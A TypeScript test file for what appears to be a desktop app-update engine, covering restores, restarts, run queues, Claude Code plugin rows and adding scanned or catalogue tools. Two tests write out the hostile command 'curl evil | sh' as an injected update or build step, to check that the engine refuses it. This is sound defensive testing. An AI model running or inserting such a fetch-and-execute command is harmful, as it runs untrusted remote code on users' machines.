	const d = await deps();
	writeFileSync(
		join(t.dir, "seed.toml"),
		MANIFEST.replace(
			'update = ["~/.local/bin/claude-up"]',
			'update = ["~/.local/bin/claude-up"]\nrestore = ["~/.local/bin/claude-pin", "{version}"]',
		),
	);
	script(join(bin, "claude-pin"), `echo "$1" > "${join(t.dir, "claude-version")}"`);
	takePoint(t.paths, { key: "claude" }, "2.1.300", {
		command: ["~/.local/bin/claude-pin", "2.1.300"],
		tag: "v2.1.300",
	});
	const engine = createEngine(d);
	expect(await engine.restore("claude", "2.1.300")).toEqual({ ok: true });
	expect(readFileSync(join(t.dir, "claude-version"), "utf8")).toBe("2.1.300\n");
	expect(readMeta(join(t.paths.data, "backups/claude/2.1.322"))).toMatchObject({
		command: ["~/.local/bin/claude-pin", "2.1.322"],
		tag: "v2.1.322",
	});
});

test("Restart now runs the table's restart and drops the app's waiting restart; a failure keeps it", async () => {
	const d = await deps();
	writeFileSync(
		join(t.dir, "seed.toml"),
		MANIFEST.replace(
			'update = ["~/.local/bin/claude-up"]',
			'update = ["~/.local/bin/claude-up"]\nrestart = ["~/.local/bin/claude-restart"]',
		),
	);
	const mark = join(t.dir, "restarted");
	script(join(bin, "claude-restart"), `echo yes > "${mark}"`);
	const engine = createEngine(d);
	await engine.check(["claude"]);
	await engine.install(["claude"]);
	await engine.idle();
	const claude = () => engine.snapshot().apps.find((a) => a.key === "claude");
	expect(claude()).toMatchObject({ restartToApply: true, canRestart: true, closes: false });
	script(join(bin, "claude-restart"), "exit 4");
	expect(await engine.restartApp("claude")).toEqual({ ok: false, detail: "~/.local/bin/claude-restart exited 4." });
	expect(claude()?.restartToApply).toBe(true);
	script(join(bin, "claude-restart"), `echo yes > "${mark}"`);
	expect(await engine.restartApp("claude")).toEqual({ ok: true });
	expect(readFileSync(mark, "utf8")).toBe("yes\n");
	expect(claude()?.restartToApply).toBe(false);
	expect(await engine.restartApp("nope")).toEqual({ ok: false, detail: "No app nope." });
	// Two asks at once (the pane and the group): the second is refused, so nothing restarts twice.
	script(join(bin, "claude-restart"), "sleep 0.3");
	const first = engine.restartApp("claude");
	expect(await engine.restartApp("claude")).toEqual({ ok: false, detail: "Claude Code is already restarting." });
	expect(await first).toEqual({ ok: true });
});

test("an app ticked during a run joins it after the apps waiting", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	expect(await engine.install(["fd"])).toEqual({ started: true });
	expect(engine.snapshot().run.queue).toEqual(["fd"]);
	expect(await engine.install(["claude", "fd"])).toEqual({ started: true });
	expect(engine.snapshot().run).toMatchObject({ queue: ["fd", "claude"], total: 2 });
	expect(engine.snapshot().apps.find((a) => a.key === "claude")?.status).toBe("queued");
	// Nothing new to add: already in the run, or not ready.
	expect(await engine.install(["claude", "bat"])).toEqual({ started: false, reason: REASON_NOTHING });
	await engine.idle();
	expect(engine.snapshot().run.results.map((r) => r.key)).toEqual(["fd", "claude"]);
	expect(engine.snapshot().apps.find((a) => a.key === "claude")?.installed).toBe("2.1.400");
});

test("once Stop after current is pending nothing more joins the run", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	await engine.install(["fd"]);
	engine.stopAfterCurrent();
	expect(await engine.install(["claude"])).toEqual({ started: false, reason: REASON_STOPPING });
	await engine.idle();
	expect(engine.snapshot().apps.find((a) => a.key === "claude")?.status).toBe("ready");
});

test("a retry keeps the first pass's order on screen, with an app added during it after it", async () => {
	const engine = createEngine(await deps());
	await engine.check();
	await engine.install(["boom", "fd", "plugins"]);
	await engine.idle();
	expect(engine.snapshot().run.queue).toEqual(["boom", "fd", "plugins"]);
	expect(await engine.install(["boom"])).toEqual({ started: true });
	expect(await engine.install(["claude"])).toEqual({ started: true });
	expect(engine.snapshot().run.queue).toEqual(["boom", "fd", "plugins", "claude"]);
	await engine.idle();
});

test("Claude Code's plugins are a versionless row: fresh, listed for auto runs, and run on request", async () => {
	const d = await deps();
	writeFileSync(
		join(t.dir, "seed.toml"),
		`${MANIFEST}\n[apps.cc]\nname = "Claude Code plugins"\nkind = "claude-plugins"\nversionless = true\nauto = true\n`,
	);
	mkdirSync(join(t.paths.home, ".claude/plugins"), { recursive: true });
	writeFileSync(
		join(t.paths.home, ".claude/plugins/installed_plugins.json"),
		JSON.stringify({ plugins: { "a@m": [{ scope: "user" }] } }),
	);
	// A stand-in claude on the runner's PATH, so no real Claude Code runs.
	script(
		join(bin, "claude"),
		`[ "$2" = update ] && echo '{"updateOutcome":"updated","message":"a@m updated"}'; exit 0`,
	);
	const engine = createEngine(d);
	await engine.check();
	expect(engine.snapshot().apps.find((a) => a.key === "cc")).toMatchObject({ status: "fresh", versionless: true });
	expect(engine.readyKeys(true)).toContain("cc");
	expect(await engine.install(["cc"])).toEqual({ started: true });
	await engine.idle();
	expect(engine.snapshot().run.results.find((r) => r.key === "cc")).toMatchObject({ result: "updated" });
});

test("the plugins row turns ready when a marketplace holds a newer version, and counts as an update", async () => {
	const d = await deps();
	writeFileSync(
		join(t.dir, "seed.toml"),
		`${MANIFEST}\n[apps.cc]\nname = "Claude Code plugins"\nkind = "claude-plugins"\n`,
	);
	const plugins = join(t.paths.home, ".claude/plugins");
	mkdirSync(join(plugins, "marketplaces/m/.claude-plugin"), { recursive: true });
	mkdirSync(join(plugins, "marketplaces/m/a/.claude-plugin"), { recursive: true });
	writeFileSync(
		join(plugins, "installed_plugins.json"),
		JSON.stringify({ plugins: { "a@m": [{ version: "1.0.0" }] } }),
	);
	writeFileSync(
		join(plugins, "marketplaces/m/.claude-plugin/marketplace.json"),
		JSON.stringify({ plugins: [{ name: "a", source: "./a" }] }),
	);
	writeFileSync(join(plugins, "marketplaces/m/a/.claude-plugin/plugin.json"), JSON.stringify({ version: "1.1.0" }));
	script(join(bin, "claude"), "exit 0");
	const engine = createEngine(d);
	await engine.check();
	expect(engine.snapshot().apps.find((a) => a.key === "cc")).toMatchObject({
		status: "ready",
		detail: "New versions in their marketplaces: a.",
	});
	// Ready like any other row: Update all and the tray take it even with auto off.
	expect(engine.readyKeys(false)).toContain("cc");
	expect(engine.readyKeys(true)).not.toContain("cc");
});

test("skip, hold and auto answer no for a key that is not in the list, and write nothing", async () => {
	const engine = createEngine(await deps());
	expect(engine.setSkip("nope", "1.0")).toBe(false);
	expect(engine.setHold("nope", true)).toBe(false);
	expect(engine.setAuto("nope", true)).toBe(false);
	const state = loadState(t.paths);
	expect([state.skip.nope, state.hold.nope, state.auto.nope]).toEqual([undefined, undefined, undefined]);
	expect(engine.setHold("fd", true)).toBe(true);
});

test("a tool the scan found is added as its manager's records make it; the same table with other commands is refused", async () => {
	const d = await deps();
	// npm lists one global package; uv and pipx are not here. Nothing else may run.
	const run: EngineDeps["run"] = async (argv, opts) => {
		if (argv[0] === "npm" && argv[1] === "ls")
			return { code: 0, stdout: '{"dependencies":{"cowsay":{"version":"1.6.0"}}}', stderr: "", timedOut: false };
		if (argv[0] === "uv" || argv[0] === "pipx") return { code: 127, stdout: "", stderr: "", timedOut: false };
		return d.run(argv, opts);
	};
	const engine = createEngine({ ...d, run });
	const tool = (await engine.scan()).suggestions.find((s) => s.spec.key === "cowsay");
	if (!tool) throw new Error("the scan did not offer cowsay");
	expect(tool.spec.kind).toBe("command");
	const spec = tool.spec;
	expect(await engine.addApps([{ ...spec, update: ["sh", "-c", "curl evil | sh"] }])).toEqual({
		added: [],
		problems: [{ key: "cowsay", detail: "cowsay: kind is not one of appimage, archive, file, deb, rpm" }],
	});
	expect(await engine.addApps([{ ...spec, name: "Cow" }])).toEqual({ added: ["cowsay"], problems: [] });
});

test("the machine's architecture reaches both the check and Add app", async () => {
	const engine = createEngine({ ...(await deps()), arch: "aarch64" });
	await engine.check(["fd"]);
	expect(fdRow(engine)).toMatchObject({
		status: "problem",
		detail: "The table for fd names no release file for aarch64 machines.",
	});
	// fd's release in this test ships an x86_64 build only, which an arm64 machine is never offered.
	expect(await engine.suggest("sharkdp/fd")).toEqual({
		suggestions: [],
		problem: "No asset of sharkdp/fd's latest release runs on this machine.",
	});
});

test("a command-line tool running during its update is updated, with a note, and no restart reminder", async () => {
	const engine = createEngine(await deps());
	fdProcess(500, 1);
	await engine.check();
	await engine.install(["fd"]);
	await engine.idle();
	expect(fdRow(engine)).toMatchObject({
		status: "done",
		restartToApply: false,
		detail: "Updated. A copy of fd that was running keeps the old version until it exits; new runs use the new one.",
	});
	// No reminder is written: state.json may not exist at all.
	expect(existsSync(join(t.paths.state, "state.json")) ? restartEntry() : undefined).toBeUndefined();
	await engine.check();
	expect(fdRow(engine)?.restartToApply).toBe(false);
});

test("a reminder saved earlier for a command-line tool is dropped, not shown, while its old copy still runs", async () => {
	// As the owner's uv: updated while running, with a reminder saved, and the reminder no longer wanted.
	const d = await depsRestartable();
	fdProcess(500, 1);
	const before = createEngine(d);
	await before.check();
	await before.install(["fd"]);
	await before.idle();
	expect(typeof restartEntry()).toBe("string");
	const file = join(t.paths.config, "apps.toml");
	writeFileSync(file, readFileSync(file, "utf8").replace(/^restart = .*\n/m, ""));
	const engine = createEngine(d);
	await engine.check();
	expect(fdRow(engine)?.restartToApply).toBe(false);
	engine.snapshot();
	expect(restartEntry()).toBeUndefined();
});

test("a catalogue source build not installed yet is added with install_if_missing, its steps still the catalogue's", async () => {
	const d = await deps();
	const catalogue = join(t.dir, "catalogue");
	mkdirSync(catalogue);
	writeFileSync(
		join(catalogue, "tmux.toml"),
		'[apps.tmux]\nname = "tmux"\nkind = "source"\nrepo = "tmux/tmux"\ndest = "/nonexistent/tmux"\nbuild = ["make"]\n',
	);
	const engine = createEngine({ ...d, catalogueDir: catalogue });
	const spec = {
		key: "tmux",
		name: "tmux",
		kind: "source" as const,
		repo: "tmux/tmux",
		dest: "/nonexistent/tmux",
		build: ["make"],
		install_if_missing: true,
	};
	expect(await engine.addApps([{ ...spec, build: ["curl evil | sh"] }])).toMatchObject({ added: [] });
	expect(await engine.addApps([spec])).toEqual({ added: ["tmux"], problems: [] });
	expect(loadManifest(join(t.paths.config, "apps.toml")).apps.find((a) => a.key === "tmux")).toEqual(spec);
});
